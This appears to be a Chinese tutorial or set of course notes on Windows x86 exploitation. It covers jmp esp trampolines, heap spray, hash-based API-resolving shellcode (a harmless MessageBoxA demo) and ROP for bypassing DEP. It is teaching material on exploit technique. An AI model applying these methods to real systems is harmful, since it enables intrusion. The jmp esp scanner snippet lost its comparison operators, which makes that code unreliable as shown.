+<h2 id="静态shellcode地址的利用技术"><a href="#静态shellcode地址的利用技术" class="headerlink" title="静态shellcode地址的利用技术"></a>静态shellcode地址的利用技术</h2><p>如果存在溢出漏洞的程序，是一个操作系统每次启动都要加载的程序，操作系统启动时为其分配的内存地址一般是<strong>固定</strong>的，则函数调用时分配的<strong>栈帧地址也是固定的</strong>。</p>
+<p>这种情况下，溢出后写入栈帧的shellcode代码其内存地址也是静态不变的，所以可以直接将shellcode代码在栈帧中的<strong>静态地址覆盖原有返回地址</strong>。在函数返回时，通过新的返回地址指向shellcode代码地址，从而执行shellcode代码。</p>
+<p>在shellcode为静态地址时，缓冲区溢出前后内存中栈帧的变化示意图参见下图。</p>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/92702b2b1adc3367f0c289c2364a9597.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/92702b2b1adc3367f0c289c2364a9597.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h2 id="基于跳板指令的地址定位技术"><a href="#基于跳板指令的地址定位技术" class="headerlink" title="基于跳板指令的地址定位技术"></a>基于跳板指令的地址定位技术</h2><p>有些软件的漏洞存在于某些动态链接库中，它们在进程运行时被<strong>动态加载</strong>，因而在下一次被重新装载到内存中时，其<strong>在内存中的栈帧地址是动态变化的</strong>，则植入的shellcode代码在内存中的起始地址也是变化的。此外，如果在使用ASLR技术的操作系统中，地址会因为<strong>引入的随机数</strong>每次发生变化。</p>
+<p>此时，需要让覆盖返回地址后新写入的返回地址能够自动定位到shellcode的起始地址。 </p>
+<p>为了解决这个问题，可以利用<strong>esp寄存器</strong>的特性实现：</p>
+<ul>
+<li>在函数调用结束后，被调用函数的栈帧被释放，esp寄存器中的栈顶指针指向返回地址<strong>在内存高地址方向的相邻位置</strong>。</li>
+<li>可见，通过esp寄存器，可以准确定位返回地址所在的位置。</li>
+</ul>
+<p>利用这种特性，可以实现对shellcode的动态定位，具体步骤如下：</p>
+<ol>
+<li>第一步，找到内存中任意一个汇编指令<code>jmp esp</code>，这条指令执行后可跳转到esp寄存器保存的地址，下面准备在溢出后<strong>将这条指令的地址覆盖返回地址</strong>。</li>
+<li>第二步，设计好缓冲区溢出漏洞利用程序中的输入数据，使缓冲区溢出后，前面的填充内容为任意数据，紧接着<strong>覆盖返回地址的是jmp esp指令的地址</strong>，再接着覆盖<strong>与返回地址相邻的高地址位置</strong>并写入shellcode代码。</li>
+<li>第三步，函数调用完成后函数返回，<strong>根据返回地址中指向的jmp esp指令的地址去执行jmp esp操作</strong>，即跳转到esp寄存器中保存的地址，而函数返回后esp中保存的地址是与返回地址相邻的高地址位置，在这个位置保存的是shellcode代码，则<strong>shellcode代码被执行</strong>。</li>
+</ol>
+<blockquote>
+<p>上述方法使用jmp esp指令做为跳板，实现了在栈帧动态分配的情况下，可以自动跳回shellcode的地址并执行。</p>
+</blockquote>
+<p>对于查找jmp esp的指令地址，可以在系统常用的user32.dll等动态链接库，或者其他被所有程序都加载的模块中查找，这些动态链接库或者模块加载的基地址始终是固定的。<br>虽然采用了ASLR技术，高版本windows系统有很多并没有受到ASLR保护的动态链接库或者系统函数，可以用来查找固定不变的jmp esp等指令。</p>
+<p><font color=red>以jmp esp做为跳板定位shellcode的内存地址示意图见下图</font></p>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/71727f6553fe50768b6983257f9c5c57.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/71727f6553fe50768b6983257f9c5c57.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><code>除了jmp esp之外，mov eax,esp和jmp eax等指令序列也可以实现进入栈区的功能。</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#define DLL_NAME &quot;user32.dll&quot; //此处定义需要查找的 dll 名字</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  BYTE *ptr;</span><br><span class="line">  int position, address;</span><br><span class="line">  HINSTANCE handle;</span><br><span class="line">  BOOL done_flag = FALSE;</span><br><span class="line">  handle = LoadLibraryA(DLL_NAME); // LoadLibraryA 是调用 dll 的函数名</span><br><span class="line">  if (!handle)                     //若没找到则进入该 if</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot; load dll error!&quot;);</span><br><span class="line">    getchar();</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = (BYTE *)handle;</span><br><span class="line">  printf(&quot;start at 0x%x\n&quot;, handle);</span><br><span class="line">  for (position = 0; !done_flag; position++)</span><br><span class="line">  &#123;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">      if (ptr[position]  0xFF &amp;&amp; ptr[position + 1]  0xE4) // jmp esp 的机器码为</span><br><span class="line">        E4FF</span><br><span class="line">        &#123;</span><br><span class="line">          address = (int)ptr + position;</span><br><span class="line">          printf(&quot;jmp esp found at 0x%x\n&quot;, address);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (2)</span><br><span class="line">    &#123;</span><br><span class="line">      address = (int)ptr + position;</span><br><span class="line">      printf(&quot;END of 0x%x\n&quot;, address);</span><br><span class="line">      done_flag = TRUE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  getchar();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">//通过上述程序运行就可以得到很多jmp esp的指令地址</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/0936007bdb35a148adfdb6dabe45e09d.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/0936007bdb35a148adfdb6dabe45e09d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>第二步，构造溢出字符串，选择一个 jmp esp 的指令，让其覆盖返回地址，在之后写入<br>原先编制后的调用 messagebox 的 shellcode。</p>
+<h2 id="内存喷洒技术"><a href="#内存喷洒技术" class="headerlink" title="内存喷洒技术"></a>内存喷洒技术</h2><p>有些特殊的软件漏洞，不支持或者不能实现<strong>精确定位</strong>shellcode。同时，<strong>存在漏洞的软件其加载地址动态变化，采用shellcode的静态地址覆盖方法难以实施</strong>。由于堆分配地址随机性较大，为了解决shellcode在堆中的定位以便触发，可以采用<code>heap spray</code>的方法。</p>
+<p><strong>内存喷射技术的代表是堆喷洒Heap spray，也称为堆喷洒技术</strong>，是在shellcode的前面加上大量的<strong>滑板指令（slide code）</strong>，组成一个非常长的注入代码段。然后向系统申请大量内存，并且<strong>反复用这个注入代码段来填充</strong>。这样就使得内存空间被大量的注入代码所占据。攻击者再结合漏洞利用技术，<strong>只要使程序跳转到堆中被填充了注入代码的任何一个地址，程序指令就会顺着滑板指令最终执行到shellcode代码</strong>。</p>
+<h3 id="滑板指令"><a href="#滑板指令" class="headerlink" title="滑板指令"></a>滑板指令</h3><p>滑板指令（slide code）是由大量<strong>NOP(no-operation)空指令0x90</strong>填充组成的指令序列，当遇到这些NOP指令时，CPU指令指针会一个指令接一个指令的执行下去，中间不做任何具体操作，直到“滑”过最后一个滑板指令后，接着执行这些指令后面的其他指令，往往后面接着的是shellcode代码。 </p>
+<p>随着一些新的攻击技术的出现，<strong>滑板指令除了利用NOP指令填充外，也逐渐开始使用更多的类NOP指令，譬如0x0C，0x0D（回车、换行）等</strong>。</p>
+<p>Heap Spray技术通过使用类NOP指令来进行覆盖，对shellcode地址的跳转准确性要求不高了，从而增加了缓冲区溢出攻击的成功率。然而，Heap Spray会导致被攻击进程的内存占用非常大，计算机无法正常运转，因而容易被察觉。</p>
+<blockquote>
+<p>它一般配合堆栈溢出攻击，不能用于主动攻击，也不能保证成功。</p>
+</blockquote>
+<p>针对Heap Spray，对于windows系统比较好的系统防范办法是<strong>开启DEP功能</strong>，即使被绕过，被利用的概率也会大大降低。</p>
+<h1 id="API函数自搜索技术"><a href="#API函数自搜索技术" class="headerlink" title="API函数自搜索技术"></a>API函数自搜索技术</h1><p>前面的Shellcode都采用<strong>硬编址</strong>的方式来调用相应API函数。首先，获取所要使用函数的地址，然后将该地址写入ShellCode，从而实现调用。如果系统版本变了，很多函数的地址往往会发生变化，那么调用肯定就会失败了。<br><strong>编写通用shellcode，shellcode自身就必须具备动态的自动搜索所需API函数地址的能力，即API函数自搜索技术。</strong><br>以MessageBoxA函数的调用的shellcode为例，来解释通用型shellcode的编写逻辑。MessageBoxA位于<code>user32.dll</code>中，用于弹出消息框。LoadLibraryA位于<code>kernel32.dll</code>中，用于加载<code>user32.dll</code>。</p>
+<h2 id="通用性Shellcode的编写逻辑"><a href="#通用性Shellcode的编写逻辑" class="headerlink" title="通用性Shellcode的编写逻辑"></a>通用性Shellcode的编写逻辑</h2><p>调用MessageBoxA函数，应该先使用LoadLibrary(“user32.dll”)装载user32.dll。</p>
+<p>定位LoadLibrary函数的步骤如下：</p>
+<ol>
+<li>定位kernel32.dll。</li>
+<li>解析kernel32.dll的导出表</li>
+<li>搜索定位LoadLibrary等目标函数。</li>
+<li>基于找到的函数地址，完成Shellcode的编写。</li>
+</ol>
+<p>难点在于第一步到第三步，即如何实现API函数自搜索。<br>所有的Win32程序都会自动加载<code>ntdll.dll</code>以及<code>kernel32.dll</code>这两个最基础的动态链接库，接下来，我们看看怎么完成对<code>kernel32.dll</code>里的API的搜索。</p>
+<h3 id="定位kernel32-dll"><a href="#定位kernel32-dll" class="headerlink" title="定位kernel32.dll"></a>定位kernel32.dll</h3><ol>
+<li>首先通过段选择字FS在内存中<strong>找到当前的线程环境块TEB</strong>。</li>
+<li>线程环境块偏移地址为<strong>0x30的地址</strong>存放着指向进程环境块PEB的指针。</li>
+<li>进程环境块中偏移地址为0x0c的地方存放着指向PEB_LDR_DATA结构体的指针，其中，存放着已经被进程装载的动态链接库的信息。</li>
+<li>PEB_LDR_DATA结构体偏移位置为<strong>0x1C的地址</strong>存放着指向模块初始化链表的头指针 InInitializationOrderModuleList。</li>
+<li>模块初始化链表InInitializationOrderModuleList中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点就是kernel32。</li>
+<li>找到属于kernel32.dll的结点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">     _asm</span><br><span class="line">     &#123;</span><br><span class="line">             mov eax, fs:[0x30] ;PEB的地址 </span><br><span class="line">             mov eax, [eax + 0x0c] ; PEB_LDR_DATA结构体的地址 </span><br><span class="line">             mov esi, [eax + 0x1c] ; InInitializationOrderModuleList地址 </span><br><span class="line">             lodsd      ;取得是双字节,即mov eax,[esi],esi=esi+4;</span><br><span class="line">             mov eax, [eax + 0x08] ;eax就是kernel32.dll的地址 </span><br><span class="line">     &#125;</span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="定位kernel32-dll-1"><a href="#定位kernel32-dll-1" class="headerlink" title="定位kernel32.dll"></a>定位kernel32.dll</h3><p>找到了kernel32.dll，由于它也是属于PE文件，那么我们可以根据PE文件的结构特征，定位其导出表，进而定位导出函数列表信息，然后进行解析、遍历搜索，找到我们所需要的API函数。<br>**定位导出表及函数列表的步骤如下： **</p>
+<ol start="7">
+<li>从kernel32.dll加载基址算起，偏移0x3c的地方就是其PE头的指针。</li>
+<li>PE头偏移0x78的地方存放着指向函数导出表的指针。</li>
+<li>获得导出函数偏移地址（RVA）列表、导出函数名列表：  • 导出表偏移0x1c处的指针指向存储导出函数偏移地址（RVA）的列表。<br> • 导出表偏移0x20处的指针指向存储导出函数函数名的列表。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov    ebp, eax                                            //将kernel32.dll基地址赋值给ebp</span><br><span class="line">mov		eax,[ebp+0x3C]	 //dll的PE头的指针（相对地址） </span><br><span class="line">mov		ecx,[ebp+eax+0x78]	//导出表的指针（相对地址）</span><br><span class="line">add		ecx,ebp	              // 得到导出表的内存地址</span><br><span class="line">mov		ebx,[ecx+0x20]		//导出函数名列表指针</span><br><span class="line">add		ebx,ebp                          //导出函数名列表指针的基地址</span><br></pre></td></tr></table></figure>
+
+<h3 id="搜索定位目标函数"><a href="#搜索定位目标函数" class="headerlink" title="搜索定位目标函数"></a>搜索定位目标函数</h3><p>可以通过<strong>遍历两个函数相关列表</strong>，<strong>算出所需函数的入口地址</strong>：</p>
+<ul>
+<li>函数的RVA地址和名字按照顺序存放在上述两个列表中，可以在名称列表中定位到所需的函数是第几个，然后在地址列表中找到对应的RVA。</li>
+<li>获得RVA后，再加上前边已经得到的动态链接库的加载地址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是最终在ShellCode中调用时需要的地址。</li>
+</ul>
+<p>按照这个方法，就可以获得kernel32.dll中的任意函数。</p>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/d9e0ffe34328af53fc6f78cef5c775d5.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/d9e0ffe34328af53fc6f78cef5c775d5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h2 id="完整的通用性Shellcode"><a href="#完整的通用性Shellcode" class="headerlink" title="完整的通用性Shellcode"></a>完整的通用性Shellcode</h2><p>为了让 shellcode 更加通用，能被大多数缓冲区容纳，总是希望 shellcode 尽可能短。<br>因此，一般情况下并不会“MessageBoxA”等这么长的字符串去进行直接比较。所以会对所需的 API 函数名进行 <strong>hash 运算</strong>，这样只要比较 hash 所得的摘要就能判定是不是我们所需的 API了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">DWORD GetHash(char *fun_name)</span><br><span class="line">&#123;</span><br><span class="line"> DWORD digest=0;</span><br><span class="line"> while(*fun_name)</span><br><span class="line"> &#123;</span><br><span class="line"> digest=((digest&lt;&lt;25)|(digest&gt;&gt;7)); //循环右移 7 位</span><br><span class="line"> /* movsx eax,byte ptr[esi] </span><br><span class="line"> cmp al,ah </span><br><span class="line"> jz compare_hash</span><br><span class="line"> ror edx, 7 ; ((循环))右移,不是单纯的 &gt;&gt;7</span><br><span class="line"> add edx,eax</span><br><span class="line"> inc esi</span><br><span class="line"> jmp hash_loop </span><br><span class="line"> */</span><br><span class="line"> digest+= *fun_name ; //累加</span><br><span class="line"> fun_name++;</span><br><span class="line"> &#125;</span><br><span class="line"> return digest;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line"> DWORD hash;</span><br><span class="line"> hash= GetHash(&quot;MessageBoxA&quot;);</span><br><span class="line"> printf(&quot;%#x\n&quot;,hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通过上述代码，我们可以获得 MessageboxA 的 hash 值。接下来，我们可以在 shellcode 中通过压栈的方式将这个 hash 值压入栈中，再通过比较得到动态链接库中的 API 地址。</p>
+</blockquote>
+<p><strong>完整 API 函数自搜索代码</strong>：首先，基于上述流程找到函数的入口地址；之后，可以编写<br>自己的 shellcode，如下面完整代码中的 function_call。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> __asm</span><br><span class="line"> &#123;</span><br><span class="line"> CLD //清空标志位 DF</span><br><span class="line"> push 0x1E380A6A //压入 MessageBoxA 的 hash--&gt;user32.dll</span><br><span class="line"> push 0x4FD18963 //压入 ExitProcess 的 hash--&gt;kernel32.dll</span><br><span class="line"> push 0x0C917432 //压入 LoadLibraryA 的 hash--&gt;kernel32.dll</span><br><span class="line"> mov esi,esp //esi=esp,指向堆栈中存放 LoadLibraryA 的 hash 的地址</span><br><span class="line"> lea edi,[esi-0xc] //空出 8 字节应该是为了兼容性</span><br><span class="line"> //开辟一些栈空间</span><br><span class="line"> xor ebx,ebx</span><br><span class="line"> mov bh,0x04</span><br><span class="line"> sub esp,ebx //esp-=0x400</span><br><span class="line"> //压入&quot;user32.dll&quot;</span><br><span class="line"> mov bx,0x3233 </span><br><span class="line"> push ebx //0x3233 </span><br><span class="line"> push 0x72657375 //&quot;user&quot;</span><br><span class="line"> push esp </span><br><span class="line"> xor edx,edx //edx=0</span><br><span class="line"> //找 kernel32.dll 的基地址</span><br><span class="line"> mov ebx,fs:[edx+0x30] //[TEB+0x30]--&gt;PEB</span><br><span class="line"> mov ecx,[ebx+0xC] //[PEB+0xC]---&gt;PEB_LDR_DATA</span><br><span class="line"> mov ecx,[ecx+0x1C]</span><br><span class="line">//[PEB_LDR_DATA+0x1C]---&gt;InInitializationOrderModuleList</span><br><span class="line"> mov ecx,[ecx] //进入链表第一个就是 ntdll.dll</span><br><span class="line"> mov ebp,[ecx+0x8] //ebp= kernel32.dll 的基地址</span><br><span class="line"> </span><br><span class="line"> //是否找到了自己所需全部的函数</span><br><span class="line">find_lib_functions:</span><br><span class="line"> lodsd //即 move eax,[esi], esi+=4, 第一次取 LoadLibraryA 的 hash</span><br><span class="line"> cmp eax,0x1E380A6A //与 MessageBoxA 的 hash 比较</span><br><span class="line"> jne find_functions //如果没有找到 MessageBoxA 函数，继续找</span><br><span class="line"> xchg eax,ebp //------------------------------------&gt; |</span><br><span class="line"> call [edi-0x8] //LoadLibraryA(&quot;user32&quot;) |</span><br><span class="line"> xchg eax,ebp //ebp=userl32.dll 的基地址,eax=MessageBoxA 的 hash </span><br><span class="line">&lt;-- |</span><br><span class="line"> </span><br><span class="line"> //导出函数名列表指针</span><br><span class="line">find_functions:</span><br><span class="line"> pushad //保护寄存器</span><br><span class="line"> mov eax,[ebp+0x3C] //dll 的 PE 头</span><br><span class="line"> mov ecx,[ebp+eax+0x78] //导出表的指针</span><br><span class="line"> add ecx,ebp //ecx=导出表的基地址</span><br><span class="line"> mov ebx,[ecx+0x20] //导出函数名列表指针</span><br><span class="line"> add ebx,ebp //ebx=导出函数名列表指针的基地址</span><br><span class="line"> xor edi,edi </span><br><span class="line"> </span><br><span class="line"> //找下一个函数名 </span><br><span class="line">next_function_loop:</span><br><span class="line"> inc edi</span><br><span class="line"> mov esi,[ebx+edi*4] //从列表数组中读取</span><br><span class="line"> add esi,ebp //esi = 函数名称所在地址</span><br><span class="line"> cdq //edx = 0</span><br><span class="line"> </span><br><span class="line"> //函数名的 hash 运算</span><br><span class="line">hash_loop: </span><br><span class="line"> movsx eax,byte ptr[esi] </span><br><span class="line"> cmp al,ah //字符串结尾就跳出当前函数 </span><br><span class="line"> jz compare_hash</span><br><span class="line"> ror edx,7</span><br><span class="line"> add edx,eax</span><br><span class="line"> inc esi</span><br><span class="line"> jmp hash_loop</span><br><span class="line"> //比较找到的当前函数的 hash 是否是自己想找的</span><br><span class="line">compare_hash:</span><br><span class="line"> cmp edx,[esp+0x1C] //lods pushad 后,栈+1c 为 LoadLibraryA 的 hash</span><br><span class="line"> jnz next_function_loop</span><br><span class="line"> mov ebx,[ecx+0x24] //ebx = 顺序表的相对偏移量</span><br><span class="line"> add ebx,ebp //顺序表的基地址</span><br><span class="line"> mov di,[ebx+2*edi] //匹配函数的序号</span><br><span class="line"> mov ebx,[ecx+0x1C] //地址表的相对偏移量</span><br><span class="line"> add ebx,ebp //地址表的基地址</span><br><span class="line"> add ebp,[ebx+4*edi] //函数的基地址 </span><br><span class="line"> xchg eax,ebp //eax&lt;&gt;ebp 交换</span><br><span class="line"> </span><br><span class="line"> pop edi</span><br><span class="line"> stosd //把找到的函数保存到 edi 的位置</span><br><span class="line"> push edi</span><br><span class="line"> </span><br><span class="line"> popad </span><br><span class="line"> cmp eax,0x1e380a6a //找到最后一个函数 MessageBox 后，跳出循环</span><br><span class="line"> jne find_lib_functions</span><br><span class="line"> //让他做些自己想做的事</span><br><span class="line">function_call:</span><br><span class="line"> xor ebx,ebx</span><br><span class="line"> push ebx </span><br><span class="line"> push 0x74736577 </span><br><span class="line"> push 0x74736577 //push &quot;westwest&quot;</span><br><span class="line"> mov eax,esp </span><br><span class="line"> push ebx</span><br><span class="line"> push eax</span><br><span class="line"> push eax</span><br><span class="line"> push ebx</span><br><span class="line"> call [edi-0x04] //MessageBoxA(NULL,&quot;westwest&quot;,&quot;westwest&quot;,NULL)</span><br><span class="line"> push ebx </span><br><span class="line"> call [edi-0x08] //ExitProcess(0);</span><br><span class="line"> nop </span><br><span class="line"> nop</span><br><span class="line"> nop</span><br><span class="line"> nop</span><br><span class="line"> &#125;</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="返回导向编程"><a href="#返回导向编程" class="headerlink" title="返回导向编程"></a>返回导向编程</h1><p><strong>DEP技术</strong>可以限制内存堆栈区的代码为不可执行状态，从而防范溢出后代码的执行，已经成为Windows的重要保护措施，但是它依然可以被绕过。</p>
+<p>支持硬件DEP的CPU会拒绝执行被标记为不可执行的(NX)内存页的代码。</p>
+<p>当我们尝试在启用DEP的内存执行代码，程序将会返回访问冲突STATUS_ACCESS_VIOLATION (0xc0000005) 并终止程序，对于攻击者来说这显然不是好事。</p>
+<p>然而，考虑应用可用性，程序有时候需要在不可执行区域执行代码，这意味着<u>调用某个Windows API可以把某段不可执行区域设置为可执行</u>。</p>
+<p><font color=red>在DEP保护下，怎么去编写shellcode来完成函数调用呢？</font></p>
+<h2 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h2><p><strong>ROP</strong></p>
+<p>ROP的全称为<code>Return-oriented programming（返回导向编程）</code>；<br>是一种新型的<strong>基于代码复用技术</strong>的攻击，<strong>它从已有的库或可执行文件中提取指令片段，构建恶意代码。</strong></p>
+<p><strong>ROP的基本思想</strong></p>
+<p>借助已存在的<strong>代码块(也叫配件，Gadget)<strong>，这些</strong>配件来自程序已经加载的模块</strong>；在已加载的模块中找到一些<strong>以retn结尾的配件</strong>，把这些配件的地址布置在堆栈上, 当控制EIP并返回时候, 程序就会跳去执行这些小配件；这些<strong>小配件是在别的模块代码段</strong>, 不受DEP的影响。</p>
+<p>对于ROP技术可以总结为以下三点：</p>
+<ol>
+<li>ROP通过ROP链（retn）实现有序汇编指令的执行。</li>
+<li>ROP链由一个个ROP小配件（Gadget，相当于一个小节点）组成。</li>
+<li>ROP小配件由“目的执行指令+retn指令组成”。</li>
+</ol>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="/2023/03/14/lou-dong-li-yong-pian/bfaa876110788b402c3230bbb021073d.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/bfaa876110788b402c3230bbb021073d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p><img src="/2023/03/14/lou-dong-li-yong-pian/3f6a87a8c73cdbc64f2aa4e114ef399b.png" class="lazyload placeholder" data-srcset="/2023/03/14/lou-dong-li-yong-pian/3f6a87a8c73cdbc64f2aa4e114ef399b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h2 id="基于ROP的漏洞利用"><a href="#基于ROP的漏洞利用" class="headerlink" title="基于ROP的漏洞利用"></a>基于ROP的漏洞利用</h2><p>ROP可以通过一些小配件构建期待的目标指令序列，但是因为它严重依赖内存中已存在的代码序列，因此，构建复杂和大规模的代码序列是非常难的。<br>在实际应用中，<strong>基于ROP编写的代码序列可以利用有限的编码完成下述目标来达到攻击的目的</strong>：</p>
+<ol>
+<li><strong>调用相关API关闭或绕过DEP保护</strong>。相关的API包括SetProcessDEPPlolicy、VirtualAlloc、NtSetInformationProcess、VirtualProtect等，比如VirtualProtect函数可以将内存块的属性修改为Executable。</li>
+<li><strong>实现地址跳转</strong>，直接转向不受DEP保护的区域里保存的shellcode执行。</li>
+<li><strong>调用相关API将shellcode写入不受DEP保护的可执行内存</strong>。进而，配合基于ROP编写的地址跳转指令，完成漏洞利用。</li>
+</ol>
+<h1 id="绕过其他安全防护"><a href="#绕过其他安全防护" class="headerlink" title="绕过其他安全防护"></a>绕过其他安全防护</h1><p> 漏洞又称为脆弱性，本书的一个观点就是只要有不健壮的地方，就存在被利用的可能。正所谓道高一尺、魔高一丈，接下来，我们简要介绍对于GS安全机制、ASLR机制、SEH保护机制等安全防护策略的绕过策略。</p>
+<h2 id="绕过GS安全机制"><a href="#绕过GS安全机制" class="headerlink" title="绕过GS安全机制"></a>绕过GS安全机制</h2><p>Visual Studio在实现<strong>GS安全机制的时候，除了增加Cookie，还会对栈中变量进行重新排序</strong>，比如：将字符串缓冲区分配在栈帧的最高地址上，因此，当字符串缓冲区溢出，就不能覆盖本地变量了。</p>
+<p>但是，<strong>考虑到效率问题，它仅按照函数隐患及危害程度进行选择性保护，因此有一部分函数可能没有得到有效的保护</strong>。比如：<u>结构成员因为互操作性问题而不能重新排列</u>，因此当它们包含缓冲区时，这个缓冲区溢出就可以将之后其它成员覆盖和控制。</p>
